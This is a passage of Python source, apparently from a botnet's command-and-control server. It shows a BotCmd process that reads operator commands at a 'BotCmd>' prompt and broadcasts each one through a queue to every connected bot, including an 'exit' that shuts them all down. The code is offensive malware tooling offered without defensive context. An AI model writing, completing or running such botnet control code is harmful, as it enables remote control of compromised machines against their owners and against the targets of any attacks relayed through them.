class BotCmd(multiprocessing.Process):
    def __init__(self, qv2):
        multiprocessing.Process.__init__(self)
        self.q = qv2

    def run(self):
        while True:
            try:
                SendCmd = str(input("BotCmd> "))
                if (SendCmd == ""):
                    pass
                elif (SendCmd == "exit"):
                    for i in range(len(Socketthread)):
                        time.sleep(0.1)
                        self.q.put(SendCmd)
                    time.sleep(5)
                    sys.exit(0)
                else:
                    print("[+] Sending Command: " + SendCmd + " to " + str(len(Socketthread)) + " bots")
                    for i in range(len(Socketthread)):
                        time.sleep(0.1)
                        self.q.put(SendCmd)
            except EOFError as e:
                break
